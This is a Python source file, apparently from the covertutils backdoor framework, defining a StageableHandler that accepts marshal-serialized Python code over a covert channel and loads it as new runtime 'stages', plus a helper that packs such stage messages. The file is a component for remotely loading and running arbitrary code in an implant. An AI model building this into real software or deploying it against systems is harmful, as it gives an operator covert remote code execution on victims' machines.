from abc import ABCMeta, abstractmethod

import marshal, types

from covertutils.handlers import FunctionDictHandler

from covertutils.helpers import defaultArgMerging


def stager_worker( storage, message ) :

	handler = storage['COMMON']['handler']
	stream, action, stage_obj = message.split( ':', 2 )
	handler.addStage( stream, stage_obj )
	return stream

stager_stage = {}
stager_stage['work'] = stager_worker.func_code
stager_stage['init'] = None

stage_obj = marshal.dumps(stager_stage)


class StageableHandler ( FunctionDictHandler ) :
	"""
The StageableHandler is a :class:`covertutils.handlers.FunctionDictHandler` that can load payloads (stages) during execution. Additional functions can be sent in a serialized form (ready stages can be found in :mod:`covertutils.payloads`).
The stage function have to be implemented according to :class:`covertutils.handlers.FunctionDictHandler` documentation.

To running `StageableHandler`s, additional functions can be packed with the :func:covertutils.handlers.`StageableHandler.createStageMessage` and sent like normal messages with a `sendAdHoc` call.
"""

	Delimiter = ':'
	Add_Action = "A"
	Replace_Action = "R"
	Delete_Action = "D"

	Defaults = { 'stage_stream' : 'stage' }

	def __init__( self, recv, send, orchestrator, **kw ) :
		"""
:param str stage_stream: The stream where all stages will be received.
		"""
		super(StageableHandler, self).__init__( recv, send, orchestrator, **kw )

		arguments = defaultArgMerging( self.Defaults, kw )
		self.stage_stream = arguments['stage_stream']
		self.addStage( self.stage_stream, stage_obj )
		# print orchestrator.streams_buckets[self.stage_stream]
		# if  self.stage_stream not in self.orchestrator.getStream() :
		# 	self.orchestrator.addStream( self.stage_stream )


	def onMessage( self, stream, message ) :
		return super( StageableHandler, self ).onMessage( stream, message )
		# if stream in self.function_dict.keys() :
		# 	self.function_dict[ stream ]( message )
		# else :
		# 	raise NoFunctionAvailableException( "The stream '%s' does not have a corresponding function." % stream )



	@staticmethod
	def createStageMessage( stream, stage_obj, replace = True ) :
		"""
:param str stream: The stream where the new stage will receive messages from.
:param str serialized_function: The stage-function serialized with the `marshal` build-in package.
:param bool replace: If True the stage that currently listens to the given stream will be replaced.
		"""
		action = 'A'
		if replace :
			action = 'R'
		message = stream + StageableHandler.Delimiter + action + StageableHandler.Delimiter + stage_obj
		return message
